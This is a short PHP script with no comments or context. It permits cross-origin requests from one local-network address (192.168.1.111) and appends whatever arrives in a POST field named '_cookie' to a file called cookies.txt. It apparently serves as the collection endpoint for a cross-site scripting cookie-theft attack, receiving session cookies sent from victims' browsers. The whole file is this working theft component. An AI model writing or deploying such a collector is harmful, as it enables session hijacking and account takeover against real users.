<?php

switch ($_SERVER['HTTP_ORIGIN']) {
	case 'http://192.168.1.111':
		header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);
		header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
		header('Access-Control-Max-Age: 1000');
		header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
		break;
}

file_put_contents('cookies.txt', "\r\n".$_POST['_cookie']."\n", FILE_APPEND);


